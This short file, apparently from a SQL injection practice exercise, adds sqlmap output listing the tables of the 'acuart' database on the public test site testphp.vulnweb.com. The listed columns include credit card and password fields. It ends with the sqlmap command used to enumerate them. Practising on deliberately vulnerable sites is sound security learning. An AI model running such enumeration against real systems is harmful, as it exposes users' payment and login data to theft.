@@ -1,0 +1,36 @@
+Database: acuart
+Table: users
+[8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| name    | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+
+Database: acuart
+Table: carts
+[3 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| cart_id | varchar(100) |
+| item    | int          |
+| price   | int          |
++---------+--------------+
+
+Database: acuart
+Table: featured
+[2 columns]
++--------------+------+
+| Column       | Type |
++--------------+------+
+| feature_text | text |
+| pic_id       | int  |
+code:
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -columns
